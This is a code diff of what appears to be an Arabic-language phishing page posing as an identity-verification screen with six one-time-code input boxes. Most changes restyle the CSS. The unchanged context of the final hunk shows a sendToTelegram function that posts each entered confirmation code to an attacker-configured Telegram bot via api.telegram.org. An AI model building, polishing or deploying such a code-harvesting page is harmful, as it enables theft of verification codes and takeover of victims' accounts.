@@ -23,32 +23,32 @@ html, body {
   padding: 0 20px;
   background: #fff;
 }
-/* header at the very top - raised higher */
+/* header fixed at the very top */
 .header-top {
-  position: absolute;
-  top: 8px; /* moved further up */
+  position: fixed;
+  top: 6px; /* very top */
   left: 0;
   right: 0;
   display: flex;
   align-items: center;
   justify-content: center;
-  pointer-events: none;
+  z-index: 999;
 }
 .header-top a {
   pointer-events: auto;
   position: absolute;
-  right: 12px;
-  top: -4px;
+  left: 12px; /* arrow on the other side */
+  top: 0;
   text-decoration: none;
   font-size: 22px;
   color: #222;
-  transform: rotate(180deg);
+  transform: none;
 }
 .header-top span { font-weight: 700; font-size: 20px; color: #222; }
 
 /* title & subtitle under header */
 .title-area {
-  margin-top: 48px; /* adjust after raising header */
+  margin-top: 56px;
   text-align: center;
 }
 .title-area h2 {
@@ -64,35 +64,36 @@ html, body {
   line-height: 1.6;
 }
 
-/* inputs placed visually in the middle - responsive smaller boxes */
+/* inputs centered vertically and horizontally - slightly smaller boxes */
 .center-area {
   position: absolute;
   left: 0;
   right: 0;
-  top: 170px; /* tweak to center visually depending on screen */
+  top: 50%;
+  transform: translateY(-50%);
   display: flex;
   justify-content: center;
 }
 .code-inputs {
   display: flex;
-  gap: 12px;
+  gap: 8px; /* smaller gap */
   align-items: center;
-  width: calc(100% - 40px); /* take wrap padding into account */
+  width: calc(100% - 40px);
   max-width: 420px;
   justify-content: center;
 }
 .code-inputs input {
-  /* responsive width that fits the available space for 6 boxes + gaps */
-  width: calc((100% - 60px) / 6); /* 100% minus total gaps (5*12=60px) */
-  max-width: 54px;
-  min-width: 36px;
-  aspect-ratio: 1 / 1; /* keep square */
+  /* smaller responsive width to better fit narrow screens */
+  width: calc((100% - 40px) / 6);
+  max-width: 44px; /* smaller */
+  min-width: 28px;
+  aspect-ratio: 1 / 1;
   border-radius: 8px;
   border: 1px solid #e6e6e8;
   background: #f3f3f4;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.03);
+  box-shadow: 0 4px 8px rgba(0,0,0,0.03);
   text-align: center;
-  font-size: 18px;
+  font-size: 15px; /* smaller font */
   color: #222;
   transition: background 0.12s, color 0.12s, box-shadow 0.12s;
 }
@@ -134,24 +135,24 @@ html, body {
 }
 .circle {
   position: relative;
-  width: 48px;
-  height: 48px;
+  width: 44px;
+  height: 44px;
 }
-.circle svg { transform: rotate(-90deg); width: 48px; height: 48px; }
+.circle svg { transform: rotate(-90deg); width: 44px; height: 44px; }
 .circle circle { fill: none; stroke-width: 4; stroke-linecap: round; }
 .circle .bg { stroke: #f0f0f0; }
 .circle .progress { stroke: #ff6a2b; stroke-dasharray: 113; stroke-dashoffset: 0; transition: stroke-dashoffset 1s linear; }
-.circle span { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 14px; font-weight: 700; color: #ff6a2b; }
+.circle span { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 13px; font-weight: 700; color: #ff6a2b; }
 #resendText { color: #bcbcbc; }
 #resendText.active { color: #444; cursor: pointer; }
 
 #nextBtn {
   width: 100%;
   border-radius: 8px;
-  padding: 16px 18px;
+  padding: 14px 18px;
   background: #efefef;
   border: none;
-  font-size: 18px;
+  font-size: 17px;
   color: #bdbdbd;
   font-weight: 700;
 }
@@ -160,17 +161,16 @@ html, body {
 /* responsive tweaks for small phones */
 @media (max-width: 420px) {
   .title-area h2 { font-size: 26px; }
-  .center-area { top: 150px; }
-  .code-inputs input { font-size: 17px; }
-  .circle { width: 40px; height: 40px; }
-  .circle svg { width: 40px; height: 40px; }
+  .code-inputs input { font-size: 14px; }
+  .circle { width: 36px; height: 36px; }
+  .circle svg { width: 36px; height: 36px; }
 }
 </style>
 </head>
 <body>
 <div class="wrap">
   <div class="header-top">
-    <a href="index.html">→</a>
+    <a href="index.html">←</a>
     <span>التحقق من الهوية</span>
   </div>
 
@@ -300,8 +300,7 @@ function sendToTelegram(code){
     alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. ضع قيم BOT_TOKEN و CHAT_ID الصحيحة في الكود لإرسال الرسائل.');
     return Promise.resolve({ok:false,error:'credentials_missing'});
   }
-  const message = `🔑 تم إدخال رمز التأكيد:
-${code}`;
+  const message = `🔑 تم إدخال رمز التأكيد:\n${code}`;
   return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:'POST',headers:{'Content-Type':'application/json'},
     body: JSON.stringify({chat_id:CHAT_ID,text:message})
